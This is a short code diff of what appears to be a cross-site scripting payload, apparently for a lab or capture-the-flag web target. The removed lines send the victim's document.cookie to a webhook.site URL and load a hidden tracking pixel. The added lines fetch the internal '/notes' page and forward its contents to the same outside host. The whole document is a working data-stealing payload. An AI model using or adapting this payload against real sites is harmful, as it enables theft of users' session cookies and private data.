@@ -1,4 +1,7 @@
 <script>
-  fetch("https://webhook.site/40aa731a-a2c1-447f-bc06-aae282f1b26e?cookie=" + document.cookie);
+fetch("http://web:3000/notes")
+  .then(res => res.text())
+  .then(data => {
+    fetch("https://webhook.site/40aa731a-a2c1-447f-bc06-aae282f1b26e?notes=" + encodeURIComponent(data));
+  });
 </script>
-<img src="https://webhook.site/40aa731a-a2c1-447f-bc06-aae282f1b26e/pixel" style="display:none" alt=""/>
